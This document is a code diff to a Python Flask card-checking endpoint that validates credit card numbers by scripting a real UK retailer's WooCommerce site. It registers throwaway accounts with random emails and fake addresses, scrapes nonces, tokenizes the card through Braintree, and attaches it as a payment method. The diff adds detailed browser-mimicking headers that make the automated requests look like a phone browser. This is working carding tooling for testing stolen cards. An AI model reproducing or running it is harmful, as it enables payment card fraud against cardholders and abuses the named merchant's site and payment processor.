@@ -82,20 +82,46 @@ def check_card():
         if not cc_details:
             return jsonify({
                 'status': 'error',
-                'message': 'Invalid format. Use: cc|mm|yy|cvv'
+                'message': 'CC parameter is required. Use: ?cc=cardnumber|mm|yy|cvv',
+                'example': '/check?cc=4111111111111111|12|26|123'
             }), 400
         
         cc_parts = cc_details.split('|')
         if len(cc_parts) != 4:
             return jsonify({
                 'status': 'error',
-                'message': 'Invalid format. Use: cc|mm|yy|cvv'
+                'message': 'Invalid format. Use: cc|mm|yy|cvv',
+                'example': '4111111111111111|12|26|123'
             }), 400
         
         cc = cc_parts[0].strip()
         mm = cc_parts[1].strip()
         yy = cc_parts[2].strip()
         cvv = cc_parts[3].strip()
+        
+        if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid card number. Must be 15-16 digits'
+            }), 400
+        
+        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid month. Must be 01-12'
+            }), 400
+        
+        if not yy.isdigit() or len(yy) != 2:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid year. Must be 2 digits (e.g., 26 for 2026)'
+            }), 400
+        
+        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid CVV. Must be 3-4 digits'
+            }), 400
         
         user_agent = get_random_user_agent()
         email = generate_random_email()
@@ -105,20 +131,24 @@ def check_card():
         braintree_session_id = str(uuid.uuid4())
         device_correlation_id = generate_random_string(16)
         
-        # Headers for requests
-        headers = {
+        headers1 = {
             'User-Agent': user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
             'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
             'Sec-Ch-Ua-Mobile': '?1',
             'Sec-Ch-Ua-Platform': '"Android"',
-            'Upgrade-Insecure-Requests': '1'
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+            'Connection': 'keep-alive',
         }
         
-        # Step 1: Get register nonce
-        response = session.get('https://www.unbeatableblinds.co.uk/my-account/', headers=headers, timeout=30)
+        response = session.get('https://www.unbeatableblinds.co.uk/my-account/', headers=headers1, timeout=30)
         
         if response.status_code != 200:
             return jsonify({
@@ -126,7 +156,6 @@ def check_card():
                 'message': f'Site returned HTTP {response.status_code}'
             }), 200
         
-        # Extract register nonce
         reg_nonce = None
         patterns = [
             r'id="woocommerce-register-nonce"\s+value="([^"]+)"',
@@ -144,10 +173,9 @@ def check_card():
         if not reg_nonce:
             return jsonify({
                 'status': 'error',
-                'message': 'Failed to get register nonce - site structure may have changed'
+                'message': 'Failed to get register nonce'
             }), 200
         
-        # Step 2: Register account
         post_data = {
             'username': username,
             'email': email,
@@ -160,6 +188,9 @@ def check_card():
             'wc_order_attribution_utm_content': '(none)',
             'wc_order_attribution_utm_id': '(none)',
             'wc_order_attribution_utm_term': '(none)',
+            'wc_order_attribution_utm_source_platform': '',
+            'wc_order_attribution_utm_creative_format': '',
+            'wc_order_attribution_utm_marketing_tactic': '',
             'wc_order_attribution_session_entry': 'https://www.unbeatableblinds.co.uk/my-account/',
             'wc_order_attribution_session_start_time': current_time,
             'wc_order_attribution_session_pages': '3',
@@ -170,24 +201,56 @@ def check_card():
             'register': 'Register'
         }
         
+        headers2 = {
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.unbeatableblinds.co.uk',
+            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/',
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
         response = session.post('https://www.unbeatableblinds.co.uk/my-account/', 
                                 data=post_data, 
-                                headers=headers, 
+                                headers=headers2, 
                                 allow_redirects=True,
                                 timeout=30)
         
-        # Step 3: Get billing address page
+        headers3 = {
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/',
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
         response = session.get('https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/', 
-                              headers=headers, 
+                              headers=headers3, 
                               timeout=30)
         
         if 'woocommerce-edit-address-nonce' not in response.text:
             return jsonify({
                 'status': 'error',
-                'message': 'Failed to get address nonce - registration may have failed'
+                'message': 'Failed to get address nonce'
             }), 200
         
-        # Extract address nonce
         address_nonce = None
         address_patterns = [
             r'id="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
@@ -207,7 +270,6 @@ def check_card():
                 'message': 'Failed to get address nonce'
             }), 200
         
-        # Step 4: Update billing address
         address_data = {
             'billing_email': email,
             'billing_first_name': uk_address['city'],
@@ -226,18 +288,50 @@ def check_card():
             'action': 'edit_address'
         }
         
+        headers4 = {
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.unbeatableblinds.co.uk',
+            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/',
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
         response = session.post('https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/', 
                                data=address_data, 
-                               headers=headers, 
+                               headers=headers4, 
                                allow_redirects=True,
                                timeout=30)
         
-        # Step 5: Get add payment method page
+        headers5 = {
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/payment-methods/',
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
         response = session.get('https://www.unbeatableblinds.co.uk/my-account/add-payment-method/', 
-                              headers=headers, 
+                              headers=headers5, 
                               timeout=30)
         
-        # Extract payment nonce
         payment_nonce = None
         payment_patterns = [
             r'id="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
@@ -257,7 +351,6 @@ def check_card():
                 'message': 'Failed to get payment nonce'
             }), 200
         
-        # Extract client nonce from script
         client_nonce = None
         script_matches = re.findall(r'<script[^>]*>([^<]+)</script>', response.text)
         
@@ -279,26 +372,30 @@ def check_card():
         if not client_nonce:
             return jsonify({
                 'status': 'error',
-                'message': 'Failed to get client nonce from script'
+                'message': 'Failed to get client nonce'
             }), 200
         
-        # Step 6: Get client token via AJAX
-        ajax_headers = {
+        headers6 = {
             'User-Agent': user_agent,
             'Accept': '*/*',
-            'Accept-Language': 'en-IN,en;q=0.9',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'Origin': 'https://www.unbeatableblinds.co.uk',
             'Referer': 'https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
-            'X-Requested-With': 'XMLHttpRequest',
-            **{k: v for k, v in headers.items() if k not in ['Accept', 'Cache-Control']}
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'X-Requested-With': 'XMLHttpRequest'
         }
         
         ajax_data = f'action=wc_braintree_credit_card_get_client_token&nonce={client_nonce}'
         
         response = session.post('https://www.unbeatableblinds.co.uk/wp-admin/admin-ajax.php',
                                data=ajax_data,
-                               headers=ajax_headers,
+                               headers=headers6,
                                timeout=30)
         
         result = response.json()
@@ -312,26 +409,13 @@ def check_card():
         token_data = json.loads(base64.b64decode(result['data']))
         auth = token_data['authorizationFingerprint']
         
-        # Step 7: Tokenize credit card via GraphQL
         graphql_payload = {
             'clientSdkMetadata': {
                 'source': 'client',
                 'integration': 'custom',
                 'sessionId': braintree_session_id
             },
-            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                tokenizeCreditCard(input: $input) {
-                    token
-                    creditCard {
-                        bin
-                        brandCode
-                        last4
-                        cardholderName
-                        expirationMonth
-                        expirationYear
-                    }
-                }
-            }''',
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
             'variables': {
                 'input': {
                     'creditCard': {
@@ -346,19 +430,23 @@ def check_card():
             'operationName': 'TokenizeCreditCard'
         }
         
-        graphql_headers = {
+        headers7 = {
             'User-Agent': user_agent,
             'Content-Type': 'application/json',
             'Authorization': f'Bearer {auth}',
             'Braintree-Version': '2018-05-10',
             'Origin': 'https://assets.braintreegateway.com',
             'Accept': 'application/json',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Sec-Fetch-Site': 'cross-site',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
             'Referer': 'https://assets.braintreegateway.com/'
         }
         
         response = requests.post('https://payments.braintree-api.com/graphql',
                                 json=graphql_payload,
-                                headers=graphql_headers,
+                                headers=headers7,
                                 timeout=30)
         
         graph_result = response.json()
@@ -379,26 +467,32 @@ def check_card():
         card_bin = cc[:6]
         card_last4 = cc[-4:]
         
-        # Step 8: Add payment method
         payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled&wc-braintree-credit-card-3d-secure-verified&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22{device_correlation_id}%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
         
-        payment_headers = {
+        headers8 = {
             'User-Agent': user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-            'Accept-Language': 'en-IN,en;q=0.9',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://www.unbeatableblinds.co.uk',
             'Referer': 'https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
-            **{k: v for k, v in headers.items() if k not in ['Accept', 'Cache-Control']}
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1'
         }
         
         response = session.post('https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
                                data=payment_data,
-                               headers=payment_headers,
+                               headers=headers8,
                                allow_redirects=True,
                                timeout=30)
         
-        # Step 9: Parse response
         response_text = response.text
         
         if 'Nice!' in response_text or 'Avs' in response_text or 'avs' in response_text or 'successfully' in response_text.lower():
